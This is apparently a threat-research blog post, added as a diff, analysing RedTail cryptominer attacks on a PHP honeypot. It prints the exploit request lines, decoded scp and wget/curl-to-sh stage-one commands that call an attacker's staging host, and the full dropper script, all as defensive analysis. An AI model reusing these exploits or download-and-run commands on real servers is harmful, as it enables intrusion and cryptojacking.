@@ -1,0 +1,500 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>RedTail Cryptominer Bot: 49 Requests, 5 Old CVEs and an SSH Key Hidden in the Payload | Global SOC</title>
+<link rel="canonical" href="https://globalsoc.com.au/blog/redtail-cryptominer-dropper-analysis/">
+<meta name="description" content="Twelve IPs running the libredtail-http bot hit our PHP honeypot with the same 49-request run. We decode the PHP-CGI payload in full, including the embedded SSH key it uses to pull the next stage over scp, and walk through the dropper script and miner binary served by the staging host.">
+<meta property="og:site_name" content="Global SOC">
+<meta property="og:locale" content="en_AU">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://globalsoc.com.au/blog/redtail-cryptominer-dropper-analysis/">
+<meta property="og:title" content="RedTail Cryptominer Bot: 49 Requests, 5 Old CVEs and an SSH Key Hidden in the Payload | Global SOC">
+<meta property="og:description" content="Twelve IPs running the libredtail-http bot hit our PHP honeypot with the same 49-request run. We decode the PHP-CGI payload in full, including the embedded SSH key it uses to pull the next stage over scp, and walk through the dropper script and miner binary served by the staging host.">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="RedTail Cryptominer Bot: 49 Requests, 5 Old CVEs and an SSH Key Hidden in the Payload | Global SOC">
+<meta name="twitter:description" content="Twelve IPs running the libredtail-http bot hit our PHP honeypot with the same 49-request run. We decode the PHP-CGI payload in full, including the embedded SSH key it uses to pull the next stage over scp, and walk through the dropper script and miner binary served by the staging host.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "@id": "https://globalsoc.com.au/blog/redtail-cryptominer-dropper-analysis/#article",
+      "url": "https://globalsoc.com.au/blog/redtail-cryptominer-dropper-analysis/",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://globalsoc.com.au/blog/redtail-cryptominer-dropper-analysis/"
+      },
+      "headline": "RedTail on a PHP Honeypot: One Bot, 49 Requests, and a Dropper That Ships Its Own SSH Key",
+      "description": "Twelve IPs running the libredtail-http bot hit our PHP honeypot with the same 49-request run. We decode the PHP-CGI payload in full, including the embedded SSH key it uses to pull the next stage over scp, and walk through the dropper script and miner binary served by the staging host.",
+      "datePublished": "2026-11-15",
+      "author": {
+        "@type": "Person",
+        "name": "Yogesh"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://globalsoc.com.au/#organization",
+        "name": "Global SOC",
+        "legalName": "Global SOC Pty Ltd",
+        "url": "https://globalsoc.com.au/"
+      },
+      "isPartOf": {
+        "@id": "https://globalsoc.com.au/blog/#blog"
+      },
+      "inLanguage": "en-AU"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://globalsoc.com.au/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Blog",
+          "item": "https://globalsoc.com.au/blog/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "RedTail on a PHP Honeypot: One Bot, 49 Requests, and a Dropper That Ships Its Own SSH Key",
+          "item": "https://globalsoc.com.au/blog/redtail-cryptominer-dropper-analysis/"
+        }
+      ]
+    }
+  ]
+}
+</script>
+<meta property="article:published_time" content="2026-11-15">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="author" content="Yogesh">
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#f5f7fa;color:#142333;font:17px/1.75 system-ui,sans-serif}
+header{background:#0b2436;color:white;padding:25px max(24px,calc((100vw - 1000px)/2))}
+header a{color:#a6e3ff;text-decoration:none}
+header a:hover{text-decoration:underline}
+main{max-width:1000px;margin:auto;padding:40px 24px 80px}
+h1{font-size:clamp(34px,5vw,52px);line-height:1.15;letter-spacing:-.035em;margin:16px 0 20px}
+h2{margin-top:52px;line-height:1.3;font-size:28px;border-bottom:1px solid #d6e1e9;padding-bottom:8px}
+h3{margin-top:32px;font-size:20px}
+p{max-width:82ch;margin:16px 0}
+pre{background:#10283a;color:#e3f2fc;padding:20px;border-radius:10px;overflow:auto;font:13.5px/1.65 Consolas,monospace;white-space:pre-wrap;overflow-wrap:anywhere}
+code{font-family:Consolas,monospace;background:#e9f0f5;color:#0b2436;padding:2px 6px;border-radius:4px;font-size:0.9em}
+pre code{background:transparent;color:inherit;padding:0}
+a{color:#076383}
+nav.toc{background:#e6f0f5;border-left:4px solid #087da4;padding:16px 22px;margin:24px 0}
+.meta{color:#47687c;font-size:14px;font-weight:600;letter-spacing:0.04em}
+table{width:100%;border-collapse:collapse;background:white;font-size:15px;margin:20px 0}
+td,th{padding:12px;border:1px solid #d6e1e9;text-align:left}
+th{background:#edf3f7}
+td code{overflow-wrap:anywhere}
+.alert-box{background:#f0fdf4;border-left:4px solid #16a34a;padding:16px 20px;border-radius:4px;margin:20px 0}
+.warn-box{background:#fef2f2;border-left:4px solid #dc2626;padding:16px 20px;border-radius:4px;margin:20px 0}
+@media(max-width:640px){table{font-size:12px}td,th{padding:6px}}
+.bar{fill:#087da4}.small{font-size:14px;color:#47687c}
+</style>
+</head>
+<body>
+<header>
+  <div style="display:flex;justify-content:space-between;align-items:center;">
+    <div><a href="/">Global SOC</a> / <a href="/blog/">Blog</a></div>
+    <div><a href="/dnsaudit/">DNS Audit</a></div>
+  </div>
+</header>
+<main>
+<p class="meta">THREAT RESEARCH &amp; LABS · Yogesh · 15 November 2026</p>
+<h1>RedTail on a PHP Honeypot: One Bot, 49 Requests, and a Dropper That Ships Its Own SSH Key</h1>
+<p>Twelve IPs running the libredtail-http bot hit our PHP honeypot with the same 49-request run. We decode the PHP-CGI payload in full, including the embedded SSH key it uses to pull the next stage over scp, and walk through the dropper script and miner binary served by the staging host.</p>
+<nav class="toc"><strong>Key Sections:</strong> Summary · The 49-Request Run · Stage One in Full · Decoded and Explained · The Shorter Variant · The Dropper Script · The Miner Binary · Did Anything Run? · Packet Capture Note · IOCs · Detection (KQL) · Mitigation</nav>
+<p class="small">Part of the <a href="/blog/honeypot-24-days-of-attacks/">PHP honeypot series</a>. Data: nginx request log and Apache container log from <code>vm-php-cve-lab</code>, 22 October – 15 November 2026 (UTC). URLs are defanged. Nothing on this page was executed.</p>
+
+<h2>1. Summary</h2>
+<p>RedTail is a Monero-mining botnet that spreads by exploiting web servers. Its scanner announces itself with the User-Agent <code>libredtail-http</code>. Between 2026-10-23 14:21:13 and 2026-11-05 14:14:57 UTC, 12 IPs running that scanner sent 545 requests to the honeypot (521 of them carrying the User-Agent). Every full run was the same 49 requests in the same order.</p>
+<p>What makes this one worth a post is the first-stage payload. Instead of the usual <code>wget | sh</code>, the early variant writes an SSH private key to disk and pulls the next stage from the attacker's server with <code>scp</code>, falling back to HTTPS only if that fails. HTTP egress filtering and proxy logs never see the download.</p>
+<p>None of it worked here. The honeypot runs PHP as an Apache module on Linux, and every exploit in the run needs something else. Section 8 shows how we know.</p>
+
+<h2>2. The 49-Request Run</h2>
+<p>Each source IP visited once, ran the list, and left:</p>
+<table><thead><tr><th>Source IP</th><th>Country</th><th>Run started (UTC)</th><th>Duration</th><th>Requests</th><th>Stage-one variant</th></tr></thead><tbody>
+<tr><td>169.58.137.184</td><td>France</td><td>2026-10-23 14:21:13</td><td>15 s</td><td>49</td><td>A: scp with embedded key, HTTPS fallback</td></tr>
+<tr><td>45.140.193.140</td><td>Brazil</td><td>2026-10-24 03:31:36</td><td>92 s</td><td>49</td><td>A: scp with embedded key, HTTPS fallback</td></tr>
+<tr><td>165.99.207.153</td><td>Pakistan</td><td>2026-10-25 01:54:02</td><td>24 s</td><td>49</td><td>A: scp with embedded key, HTTPS fallback</td></tr>
+<tr><td>102.244.97.185</td><td>Cameroon</td><td>2026-10-25 10:47:07</td><td>31 s</td><td>49</td><td>A: scp with embedded key, HTTPS fallback</td></tr>
+<tr><td>119.15.169.38</td><td>Vietnam</td><td>2026-10-25 17:22:56</td><td>24 s</td><td>49</td><td>A: scp with embedded key, HTTPS fallback</td></tr>
+<tr><td>184.185.26.51</td><td>United States</td><td>2026-10-27 06:40:38</td><td>20 s</td><td>49</td><td>A: scp with embedded key, HTTPS fallback</td></tr>
+<tr><td>101.35.95.146</td><td>China</td><td>2026-10-29 04:43:03</td><td>14 s</td><td>49</td><td>B: HTTPS download only</td></tr>
+<tr><td>157.245.84.42</td><td>United States</td><td>2026-10-29 14:56:02</td><td>16 s</td><td>49</td><td>B: HTTPS download only</td></tr>
+<tr><td>58.182.58.128</td><td>Singapore</td><td>2026-10-29 22:27:26</td><td>89 s</td><td>49</td><td>B: HTTPS download only</td></tr>
+<tr><td>209.99.187.10</td><td>Switzerland</td><td>2026-10-31 14:11:59</td><td>8 s</td><td>6</td><td>B: HTTPS download only</td></tr>
+<tr><td>51.159.5.6</td><td>France</td><td>2026-11-04 08:56:33</td><td>81 s</td><td>49</td><td>B: HTTPS download only</td></tr>
+<tr><td>171.34.139.222</td><td>China</td><td>2026-11-05 14:12:31</td><td>146 s</td><td>49</td><td>B: HTTPS download only</td></tr>
+</tbody></table>
+<p>One IP stopped after six requests. The other eleven sent all 49. The run breaks down like this (first run, from 169.58.137.184):</p>
+<table><thead><tr><th>Order</th><th>Technique</th><th>Requests</th><th>Status returned</th></tr></thead><tbody>
+<tr><td>1</td><td>Apache 2.4.49/2.4.50 path traversal to /bin/sh (CVE-2021-41773, CVE-2021-42013)</td><td>2</td><td>400 x 2</td></tr>
+<tr><td>2</td><td>PHP-CGI argument injection (CVE-2024-4577 and CVE-2012-1823)</td><td>5</td><td>200 x 3, 404 x 2</td></tr>
+<tr><td>3</td><td>PHPUnit eval-stdin.php (CVE-2017-9841)</td><td>37</td><td>404 x 37</td></tr>
+<tr><td>4</td><td>ThinkPHP 5 invokefunction RCE</td><td>2</td><td>200 x 1, 404 x 1</td></tr>
+<tr><td>5</td><td>pearcmd.php via local file inclusion</td><td>1</td><td>200 x 1</td></tr>
+<tr><td>6</td><td>Include of the file pearcmd was told to write</td><td>1</td><td>200 x 1</td></tr>
+<tr><td>7</td><td>Docker Engine API (/containers/json)</td><td>1</td><td>404 x 1</td></tr>
+</tbody></table>
+<p>The full request sequence of that run, as logged by nginx (time, method, status, URI):</p>
+<pre><code>14:21:13  POST 400  /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
+14:21:13  POST 400  /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
+14:21:14  POST 404  /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+14:21:14  POST 200  /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+14:21:14  POST 200  /index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input
+14:21:15  POST 404  /test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input
+14:21:15  POST 200  /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
+14:21:15  GET  404  /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:16  GET  404  /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
+14:21:16  GET  404  /vendor/phpunit/src/Util/PHP/eval-stdin.php
+14:21:16  GET  404  /vendor/phpunit/Util/PHP/eval-stdin.php
+14:21:16  GET  404  /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
+14:21:17  GET  404  /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:17  GET  404  /phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:17  GET  404  /phpunit/phpunit/Util/PHP/eval-stdin.php
+14:21:18  GET  404  /phpunit/src/Util/PHP/eval-stdin.php
+14:21:18  GET  404  /phpunit/Util/PHP/eval-stdin.php
+14:21:18  GET  404  /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:19  GET  404  /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
+14:21:19  GET  404  /lib/phpunit/src/Util/PHP/eval-stdin.php
+14:21:19  GET  404  /lib/phpunit/Util/PHP/eval-stdin.php
+14:21:20  GET  404  /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:20  GET  404  /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:20  GET  404  /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:20  GET  404  /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:21  GET  404  /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:21  GET  404  /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:21  GET  404  /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:22  GET  404  /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:22  GET  404  /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:22  GET  404  /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:23  GET  404  /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:23  GET  404  /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:23  GET  404  /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:24  GET  404  /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:24  GET  404  /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:24  GET  404  /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:24  GET  404  /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:25  GET  404  /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:25  GET  404  /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:25  GET  404  /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:26  GET  404  /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:26  GET  404  /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:26  GET  404  /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+14:21:27  GET  200  /index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=Hello
+14:21:27  GET  404  /public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=Hello
+14:21:27  GET  200  /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/&lt;?echo(md5("hi"))
+14:21:28  GET  200  /index.php?lang=../../../../../../../../tmp/index1
+14:21:28  GET  404  /containers/json</code></pre>
+<p>The two opening requests have no User-Agent and nginx rejected them with <code>400</code> before logging a URI, because the traversal sequences are not a valid path. They are the Apache 2.4.49 / 2.4.50 traversal (<code>/cgi-bin/.%2e/.%2e/…/bin/sh</code> and the double-encoded <code>%%32%65</code> form). The 37 PHPUnit requests all carry the body <code>&lt;?php echo(md5("Hello PHPUnit"));</code> — a check, not a payload: the bot looks for the MD5 in the response and only then sends the real thing. The same is true of the ThinkPHP (<code>md5("Hello")</code>) and pearcmd (<code>md5("hi")</code>) requests. Only the PHP-CGI requests carry the dropper on first contact.</p>
+
+<h2>3. Stage One in Full</h2>
+<p>The five PHP-CGI request lines sent in every run:</p>
+<table><thead><tr><th>#</th><th>Request line</th><th>What it targets</th><th>Honeypot answer</th></tr></thead><tbody>
+<tr><td>1</td><td><code>POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1</code></td><td>Windows PHP-CGI &quot;best fit&quot; bypass (soft hyphen 0xAD becomes &quot;-&quot;), any path handled by php-cgi</td><td>404</td></tr>
+<tr><td>2</td><td><code>POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1</code></td><td>Same, against the site root</td><td>200</td></tr>
+<tr><td>3</td><td><code>POST /index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input HTTP/1.1</code></td><td>Same with the percent sign double-encoded, for servers that decode twice</td><td>200</td></tr>
+<tr><td>4</td><td><code>POST /test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input HTTP/1.1</code></td><td>Double-encoded variant on a second made-up path</td><td>404</td></tr>
+<tr><td>5</td><td><code>POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1</code></td><td>The original 2012 form with a plain &quot;-d&quot;</td><td>200</td></tr>
+</tbody></table>
+<p>All five say the same thing to a vulnerable <code>php-cgi</code>: <code>-d allow_url_include=1 -d auto_prepend_file=php://input</code>. That turns on remote includes and tells PHP to run the request body before the requested script. On Windows, CVE-2024-4577 lets the soft hyphen (<code>%AD</code>) through the 2012 fix because the code page conversion maps it to a normal hyphen.</p>
+<p>One of those requests exactly as nginx logged it (nginx recorded the request line, User-Agent, Content-Type and body; other headers were not logged). The body is 1,189 bytes; the base64 string is shortened here and decoded in full in the next section:</p>
+<pre><code>2026-10-23 14:21:14 UTC  169.58.137.184 (France)  status 200  request 1463 bytes  response 3689 bytes
+
+POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
+User-Agent: libredtail-http
+Content-Type: application/x-www-form-urlencoded
+
+&lt;?php shell_exec(base64_decode("Y2QgL3RtcCB8fCBjZCAvdmFyL3RtcCB8fCBjZCAvZGV2L3NobTsgZWNobyAnLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUg[... 960 base64 characters, decoded in full below ...]ZV8yMDI0XzQ1Nzc7IGZpOyBybSAtcmYgc3NoY2ZnIGtleS5wcGsgb3V0X3No"))  echo(md5("Hello CVE-2024-4577"))  ?&gt;</code></pre>
+
+<h2>4. Decoded and Explained</h2>
+<p>The 1,116-character base64 string decodes to this shell script. We removed the body of the private key; everything else is as sent (line breaks added after each <code>;</code>):</p>
+<pre><code>cd /tmp || cd /var/tmp || cd /dev/shm;
+echo '-----BEGIN OPENSSH PRIVATE KEY-----
+[private key body removed by Global SOC]
+-----END OPENSSH PRIVATE KEY-----' &gt; key.ppk;
+echo 'StrictHostKeyChecking no
+UserKnownHostsFile /dev/null' &gt; sshcfg;
+chmod 400 key.ppk;
+scp -s -F sshcfg -i key.ppk dlr@217.60.102.5:sh out_sh;
+if [ $? -eq 0 ];
+then chmod +x out_sh;
+sh out_sh cve_2024_4577 &gt;/dev/null 2&gt;&amp;1;
+else (wget --no-check-certificate -qO- hxxps://217.60.102.5/sh || curl -sk hxxps://217.60.102.5/sh) | sh -s cve_2024_4577;
+fi;
+rm -rf sshcfg key.ppk out_sh</code></pre>
+<table>
+<tr><th>Step</th><th>What it does</th></tr>
+<tr><td><code>cd /tmp || cd /var/tmp || cd /dev/shm</code></td><td>Find a directory the web server user can write to.</td></tr>
+<tr><td><code>echo '-----BEGIN OPENSSH PRIVATE KEY…' &gt; key.ppk</code></td><td>Write an ed25519 private key to disk. The name says PuTTY but the format is OpenSSH. The key's comment is <code>dlr@sftp</code> ("downloader").</td></tr>
+<tr><td><code>echo 'StrictHostKeyChecking no…' &gt; sshcfg</code></td><td>A two-line SSH config so the client does not prompt about the unknown host key and does not write to <code>known_hosts</code>.</td></tr>
+<tr><td><code>scp -s -F sshcfg -i key.ppk dlr@217.60.102.5:sh out_sh</code></td><td>Log in to the staging host as user <code>dlr</code> with that key and copy the file <code>sh</code>. <code>-s</code> forces the SFTP subsystem. This goes out on TCP 22, not 80 or 443.</td></tr>
+<tr><td><code>sh out_sh cve_2024_4577</code></td><td>Run the downloaded script. The argument is a campaign tag: it tells the operator which exploit landed.</td></tr>
+<tr><td><code>else (wget … || curl …) | sh -s cve_2024_4577</code></td><td>If scp failed (no client, port 22 blocked), fetch the same script over HTTPS with certificate checks off and pipe it to <code>sh</code>.</td></tr>
+<tr><td><code>rm -rf sshcfg key.ppk out_sh</code></td><td>Remove the key, config and script.</td></tr>
+<tr><td><code>echo(md5("Hello CVE-2024-4577"))</code></td><td>Back in PHP: print a known hash so the scanner can tell from the response that the code ran.</td></tr>
+</table>
+<p>The public half of the embedded key, which is safe to publish and useful for hunting (<code>authorized_keys</code> on a seized or sinkholed staging host, or the same key reused elsewhere):</p>
+<pre><code>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO94S34m0hVkYFUhtWQe92S9Cp0yJp+7n8gw696Uf/LG dlr@sftp
+SHA256:O/at8341SoPpKvTPvMsJSgjQm30md9VTS2it25sY0vg</code></pre>
+<p>Shipping a private key to every target means every victim, honeypot and researcher holds a login to the staging host's <code>dlr</code> account. The operator is betting that the account is locked down to read-only SFTP. We did not test that; logging in to someone else's server with a found key is unauthorised access.</p>
+
+<h2>5. The Shorter Variant</h2>
+<p>From 29 October the runs carried a 229-byte body with no key and no scp:</p>
+<pre><code>2026-10-29 04:43:04 UTC  101.35.95.146 (China)  status 200  request 502 bytes  response 3689 bytes
+
+POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
+User-Agent: libredtail-http
+Content-Type: application/x-www-form-urlencoded
+
+&lt;?php shell_exec(base64_decode("KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMjE3LjYwLjEwMi41L3NoIHx8IGN1cmwgLXNrIGh0dHBzOi8vMjE3LjYwLjEwMi41L3NoKSB8IHNoIC1zIGN2ZV8yMDI0XzQ1Nzc="))  echo(md5("Hello CVE-2024-4577"))  ?&gt;</code></pre>
+<p>Decoded:</p>
+<pre><code>(wget --no-check-certificate -qO- hxxps://217.60.102.5/sh || curl -sk hxxps://217.60.102.5/sh) | sh -s cve_2024_4577</code></pre>
+<p>Same server, same script name, same campaign tag. Both variants were in circulation in the same fortnight; the table in section 2 shows which IP sent which.</p>
+
+<h2>6. The Dropper Script</h2>
+<p>The lab holds a copy of the <code>sh</code> script served by the staging host, saved on 23 October 2026 at 05:03 UTC. It is 2,312 bytes. In full (URLs defanged):</p>
+<pre><code>#!/bin/bash
+
+get_random_string() {
+  len=$(expr $(od -An -N2 -i /dev/urandom 2&gt;/dev/null | tr -d ' ') % 32 + 4 2&gt;/dev/null)
+
+  if command -v openssl &gt;/dev/null 2&gt;&amp;1; then
+    str=$(openssl rand -base64 256 2&gt;/dev/null | tr -dc 'A-Za-z0-9' | head -c "$len")
+    if [ -n "$str" ]; then
+      echo "$str"
+      return 0
+    fi
+  fi
+
+  if [ -r /dev/urandom ]; then
+    str=$(tr -dc 'A-Za-z0-9' &lt;/dev/urandom 2&gt;/dev/null | head -c "$len")
+    if [ -n "$str" ]; then
+      echo "$str"
+      return 0
+    fi
+  fi
+
+  if [ -n "$RANDOM" ]; then
+    echo "$RANDOM"
+    return 0
+  fi
+
+  # If all else fails
+  echo "redtail"
+  return 1
+}
+
+dlr() {
+  rm -rf $1
+  wget --no-check-certificate -q hxxps://217.60.102.5/$1 || curl -skO hxxps://217.60.102.5/$1
+}
+
+get_noexec_dirs() {
+  if command -v findmnt &gt;/dev/null 2&gt;&amp;1; then
+    findmnt -rn -O noexec -o TARGET
+  else
+    cat /proc/mounts | grep 'noexec' | awk '{print $2}'
+  fi
+}
+
+NOEXEC_DIRS=$(get_noexec_dirs)
+EXCLUDE=""
+
+for dir in $NOEXEC_DIRS; do
+  EXCLUDE="${EXCLUDE} -not -path \"$dir\" -not -path \"$dir/*\""
+done
+
+FOLDERS=$(eval find / -type d -user $(whoami) -perm -u=rwx -not -path \"/tmp/*\" -not -path \"/proc/*\" $EXCLUDE 2&gt;/dev/null)
+ARCH=$(uname -mp)
+OK=true
+FILENAME=".$(get_random_string)"
+
+for i in $FOLDERS /tmp /var/tmp /dev/shm; do
+  if cd "$i" &amp;&amp; touch .testfile &amp;&amp; (dd if=/dev/zero of=.testfile2 bs=2M count=1 &gt;/dev/null 2&gt;&amp;1 || truncate -s 2M .testfile2 &gt;/dev/null 2&gt;&amp;1); then
+    rm -rf .testfile .testfile2
+    break
+  fi
+done
+
+dlr clean
+chmod +x clean
+sh clean &gt;/dev/null 2&gt;&amp;1
+rm -rf clean
+
+rm -rf .redtail
+rm -rf $FILENAME
+
+if echo "$ARCH" | grep -q "x86_64" || echo "$ARCH" | grep -q "amd64"; then
+  dlr x86_64
+  mv -f x86_64 $FILENAME
+elif echo "$ARCH" | grep -q "i[3456]86"; then
+  dlr i686
+  mv -f i686 $FILENAME
+elif echo "$ARCH" | grep -q "armv8" || echo "$ARCH" | grep -q "aarch64"; then
+  dlr aarch64
+  mv -f aarch64 $FILENAME
+elif echo "$ARCH" | grep -q "armv7"; then
+  dlr arm7
+  mv -f arm7 $FILENAME
+elif echo "$ARCH" | grep -q "riscv"; then
+  dlr riscv
+  mv -f riscv $FILENAME
+else
+  OK=false
+  for a in x86_64 i686 aarch64 arm7 riscv; do
+    dlr $a
+    cat $a &gt;$FILENAME
+    chmod +x $FILENAME
+    ./$FILENAME $1 &gt;/dev/null 2&gt;&amp;1
+    rm -rf $a
+  done
+fi
+
+if [ $OK = true ]; then
+  chmod +x $FILENAME
+  ./$FILENAME $1 &gt;/dev/null 2&gt;&amp;1
+fi
+</code></pre>
+<p>What it does, in order:</p>
+<ol>
+<li><strong>Picks a random hidden filename.</strong> <code>get_random_string</code> builds a 4–35 character name from OpenSSL or <code>/dev/urandom</code> and prefixes a dot. If every random source fails, it falls back to the literal name <code>redtail</code>, which is where the malware's name comes from.</li>
+<li><strong>Finds somewhere it can execute.</strong> It lists <code>noexec</code> mounts, searches the whole filesystem for directories the current user owns with <code>rwx</code>, and takes the first one where it can create a 2 MB file. <code>/tmp</code>, <code>/var/tmp</code> and <code>/dev/shm</code> are the last resort, not the first.</li>
+<li><strong>Runs <code>clean</code>.</strong> A second script from the same host, run and deleted. We do not have a copy of it.</li>
+<li><strong>Removes the previous install</strong> (<code>.redtail</code>).</li>
+<li><strong>Downloads the binary for the CPU</strong>: <code>x86_64</code>, <code>i686</code>, <code>aarch64</code>, <code>arm7</code> or <code>riscv</code>. If the architecture is unknown it downloads and tries all five.</li>
+<li><strong>Runs it with the campaign tag</strong> (<code>$1</code>, here <code>cve_2024_4577</code>) as the only argument.</li>
+</ol>
+<p>There is no persistence in this script: no cron entry, no systemd unit, no <code>authorized_keys</code> edit. If the miner persists, the binary does it.</p>
+
+<h2>7. The Miner Binary</h2>
+<p>The <code>x86_64</code> file from the same host, saved at the same time:</p>
+<pre><code>917fcc9131c6e9ca16264a85afc62532297bb39eb9d37765dad536c7c8c7735c  /var/log/captured-redtail-dropper.sh
+f0aa83bbbd2c75e2f71ec16029ee5fcfad59f3a8efa30a500b815f0f6c18d987  /var/log/captured-redtail-x86_64
+8c34ff72c7eed017b8c25471ce5a8cad  /var/log/captured-redtail-dropper.sh
+1f47ecc10bc008ad26e504897b940f22  /var/log/captured-redtail-x86_64
+/var/log/captured-redtail-dropper.sh: Bourne-Again shell script, ASCII text executable
+/var/log/captured-redtail-x86_64:     ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
+
+ELF 64-bit LSB executable, x86-64, statically linked, no section header, 1,989,056 bytes
+$Id: UPX 5.20 Copyright (C) 1996-2026 the UPX Team. All Rights Reserved. $
+$Info: This file is packed with the UPX executable packer hxxp://upx.sf.net $</code></pre>
+<p>It is UPX-packed with the section headers stripped. We hashed it and read its strings on the lab VM. We did not unpack or run it, so we make no claim about its configuration or mining pool; public reporting on RedTail describes an XMRig-based Monero miner.</p>
+<p>A note on provenance: both files sit in <code>/var/log</code> on the VM host, not inside the PHP container, and the container's filesystem diff (below) shows no dropper and no binary. They were not written by an exploit that succeeded. Their timestamp is eight minutes after another actor used the same staging URL in a PHP2Shell attempt (covered in the <a href="/blog/php2shell-exploitation-in-the-wild/">PHP2Shell post</a>); the lab's records do not say who saved them.</p>
+
+<h2>8. Did Anything Run?</h2>
+<p>No. Three independent checks:</p>
+<p><strong>Response size.</strong> Apache inside the container logged the five PHP-CGI requests of the first run like this:</p>
+<pre><code>172.18.0.1 - - [23/Oct/2026:14:21:14 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.0" 404 495 "-" "libredtail-http"
+172.18.0.1 - - [23/Oct/2026:14:21:14 +0000] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.0" 200 3685 "-" "libredtail-http"
+172.18.0.1 - - [23/Oct/2026:14:21:14 +0000] "POST /index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input HTTP/1.0" 200 3685 "-" "libredtail-http"
+172.18.0.1 - - [23/Oct/2026:14:21:15 +0000] "POST /test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input HTTP/1.0" 404 495 "-" "libredtail-http"
+172.18.0.1 - - [23/Oct/2026:14:21:15 +0000] "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.0" 200 3685 "-" "libredtail-http"</code></pre>
+<p>The two made-up paths are 404. The three that reached <code>index.php</code> returned 3,685 bytes. A plain <code>GET /</code> with no exploit attached returns the same 3,685 bytes (1,544 times in the Apache log). Had the body executed, the response would be 32 bytes longer for the MD5 marker alone.</p>
